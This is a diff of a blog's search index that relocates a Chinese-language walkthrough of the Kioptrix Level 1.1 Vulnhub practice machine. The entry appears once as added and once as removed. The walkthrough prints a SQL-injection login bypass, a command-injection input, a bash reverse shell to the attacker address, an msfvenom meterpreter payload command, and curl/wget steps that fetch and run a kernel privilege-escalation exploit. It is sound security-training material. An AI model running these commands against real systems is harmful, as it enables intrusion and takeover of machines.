@@ -236,6 +236,162 @@
       </tags>
   </entry>
   <entry>
+    <title>Kioptrix Level 1.1(#2)</title>
+    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
+<p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
+<li>nmap扫描端口及端口服务</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>看到了web服务：80端口和443端口</strong></p>
+<ul>
+<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
+<ul>
+<li>F12 查看源代码</li>
+</ul>
+<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">
+
+<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
+<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
+<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
+<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
+</li>
+<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
+<ul>
+<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
+</ul>
+</li>
+<li><p>成功后看到以下页面：</p>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
+<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
+<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
+<ul>
+<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
+<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
+<p><strong>证明确实存在RCE</strong></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
+<p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
+<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
+</li>
+<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
+</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
+<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
+<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
+<p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<ul>
+<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
+<p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
+<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>
+
+<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
+<p><strong>发现Linux版本是CentOS 4.5</strong></p>
+<ul>
+<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
+</ul>
+<blockquote>
+<p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
+<li><code>searchsploit CentOS 4.5</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
+<ul>
+<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
+</ul>
+<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
+<ul>
+<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
+<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
+<ul>
+<li>同时在攻击机上也可以看到靶机的信息</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
+<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
+<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
+</li>
+<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
+</li>
+<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
+</li>
+<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
+</li>
+</ul>
+<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
+<p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
+<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
+</ul>
+<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
+<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
+</ul>
+<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
+<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
+</li>
+<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
+<ul>
+<li>LinEnum 可以枚举信息</li>
+<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
+</ul>
+<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
+</li>
+<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
+</li>
+</ul>
+<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
+<li>Python建立简单http服务</li>
+<li>在攻击机中开启apache</li>
+</ul>
+<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
+<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
+</ul>
+]]></content>
+      <categories>
+        <category>类OSCP靶机练习</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptrix Level 1.2(#3)</title>
     <url>/2024/02/11/Kioptrix_Level_1.2/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-1-2-3"><a href="#Kioptrix-Level-1-2-3" class="headerlink" title="Kioptrix Level 1.2(#3)"></a>Kioptrix Level 1.2(#3)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul>
@@ -397,162 +553,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptrix Level 1.1(#2)</title>
-    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
-<p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
-<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
-<li>nmap扫描端口及端口服务</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>看到了web服务：80端口和443端口</strong></p>
-<ul>
-<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
-<ul>
-<li>F12 查看源代码</li>
-</ul>
-<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">
-
-<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
-<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
-<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
-<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
-</li>
-<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
-<ul>
-<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
-</ul>
-</li>
-<li><p>成功后看到以下页面：</p>
-</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
-<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
-<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
-<ul>
-<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
-<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
-<p><strong>证明确实存在RCE</strong></p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
-<p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
-<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
-</li>
-<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
-</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
-<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
-<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
-<p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<ul>
-<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
-<p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
-<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
-</ul>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>
-
-<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
-<p><strong>发现Linux版本是CentOS 4.5</strong></p>
-<ul>
-<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
-</ul>
-<blockquote>
-<p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
-<li><code>searchsploit CentOS 4.5</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
-<ul>
-<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
-</ul>
-<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
-<ul>
-<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
-<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
-<ul>
-<li>同时在攻击机上也可以看到靶机的信息</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
-<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
-<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
-</li>
-<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
-</li>
-<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
-</li>
-<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
-</li>
-</ul>
-<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
-<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
-<p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
-<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
-</ul>
-<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
-<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
-</ul>
-<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
-<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
-</li>
-<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
-<ul>
-<li>LinEnum 可以枚举信息</li>
